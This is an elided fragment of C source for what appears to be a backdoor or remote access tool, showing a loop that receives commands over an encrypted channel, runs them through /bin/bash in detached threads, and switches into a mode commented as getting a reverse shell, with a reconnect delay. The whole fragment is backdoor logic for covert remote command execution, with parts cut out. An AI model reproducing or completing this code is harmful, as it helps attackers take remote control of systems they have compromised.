...
int runshell(int client)
{
	...
	if (len == 1 && message[0] == RUNSHELL) { //get reverse shell
...
void *thread_execl(void* cmd)
{
	...
	{
		execl("/bin/bash", "bash", "-c", _cmd, (char *)0);
	} else {
		int status;
		wait(&status);
	}
...
int runcmd_no_output(int client)
{
	char *temp, *shell;
	int ret, len, pid, n;
	memset(message, '\0' , 4097); 

	ret = pel_recv_msg(client, message, &len); //receive command
	...
	char* _cmd = (char*)malloc(len+1);
	memset(_cmd, '\0', len+1);
	memcpy(_cmd, message, len);

	pthread_t thread_runcmd;  
    pthread_create(&thread_runcmd, NULL, (void*)thread_execl, (void*)_cmd); // thread for sending data
    pthread_detach(thread_runcmd);
	...
	connect:
		...
		if (ret == PEL_SUCCESS || len == 1) {
			...
			case RUNSHELL:
				...
				goto connect;
			case RUNCMD_NO_OUTPUT:
				runcmd_no_output(client);
				goto connect;
			case SET_DELAY:
